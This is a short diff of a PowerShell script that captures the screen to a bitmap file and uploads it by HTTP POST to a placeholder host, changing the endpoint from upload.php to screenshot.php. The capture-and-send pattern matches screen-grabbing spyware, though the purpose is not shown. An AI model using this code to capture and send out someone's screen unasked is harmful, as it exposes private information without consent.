@@ -11,4 +11,4 @@ $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
 $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 $bitmap.Save($File) 
-Invoke-RestMethod -Uri http://example.org/upload.php -Method Post -Infile $File
+Invoke-RestMethod -Uri http://example.org/screenshot.php -Method Post -Infile $File
